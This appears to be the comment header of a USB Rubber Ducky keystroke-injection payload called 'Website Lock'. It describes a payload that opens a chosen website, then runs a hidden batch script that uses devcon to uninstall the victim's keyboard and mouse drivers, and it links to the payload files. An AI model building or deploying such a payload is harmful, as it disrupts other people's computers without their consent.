REM Title: Website Lock
REM Author: Audiack
REM Target Ducky Encoder: 2.6.2
REM Target OS: Windows 7 (32 and 64 bit), maybe older/newer windows versions. Haven't tested it on any other than 7.
REM Description: Plays off of Aprizm's script to open a website, but it also disables the mouse and keyboard so the user can't leave the website.
REM Info:
REM     The user can easily unplug and re-plug in the keyboard/mouse to reinstall the drivers get them working again. 
REM     This requires the user to plug a USB drive in BEFORE the ducky is plugged in.
REM     The files are here: https://www.dropbox.com/sh/i09leu4kcifta6a/AACEFYQnlOIUsDtLLrQuemCha?dl=0.
REM     Make sure the files are in the root of a drive called DUCKY.
REM     Twin duck works well with this. It is what I used when I was testing it. 
REM File Descriptions:
REM     The devcon32 & devcon64 are the files used to uninstall the keyboard and mouse drivers (for the two architectures).
REM     The invisible.vbs is used to run the batch script invisibly after the video is in fullscreen.
REM     The TheRealAnnoyance.bat is the batch script run in the background that disables their mouse & keyboard.
REM     The WebsiteLink.txt contains the website link. The user can change this as desired. Make sure there are no spaces and there is only a single link.
REM     If you are going to modify the website link as a youtube video, it needs to be in this format: https://www.youtube.com/embed/sCNrK-n68CM?rel=0&autoplay=1&loop=1
REM     Find the youtube video you want, then take the part after watch?v= and put it in place of sCNrK-n68CM in the above link.
